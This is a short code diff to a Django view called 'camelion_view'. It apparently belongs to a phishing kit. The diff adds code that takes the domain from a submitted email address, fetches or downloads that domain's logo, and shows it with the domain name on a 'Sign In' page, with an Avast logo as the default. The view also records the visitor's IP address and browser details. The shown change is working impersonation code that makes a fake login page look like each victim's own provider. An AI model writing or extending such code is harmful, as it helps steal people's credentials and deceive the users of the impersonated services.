@@ -8,6 +8,7 @@ from django.urls import reverse
 from django.http import HttpResponseRedirect
 
 from .utils import get_browser_info,get_client_ip
+from .get_logo import get_or_download_logo
 
 def camelion_view(request):
     if request.method == 'POST':
@@ -64,6 +65,7 @@ def camelion_view(request):
         email_is_valid = False
         domain = None
         base_domain = "Sign In"
+        logo_url = '/static/img/avast.png'
 
         try:
             if existing_email:
@@ -73,6 +75,9 @@ def camelion_view(request):
                 # Extract clean base domain
                 extracted = tldextract.extract(domain)
                 base_domain = extracted.domain
+
+                # get logo url 
+                logo_url = get_or_download_logo(domain)
         except ValidationError:
             existing_email = ''
             # email_is_valid = False
@@ -83,5 +88,6 @@ def camelion_view(request):
             'email_is_valid': email_is_valid,
             'logo_text': base_domain.upper(),
             'domain':domain,
+            'logo_url':logo_url,
         }
     return render(request, 'camelion/camelion_one.html', context)
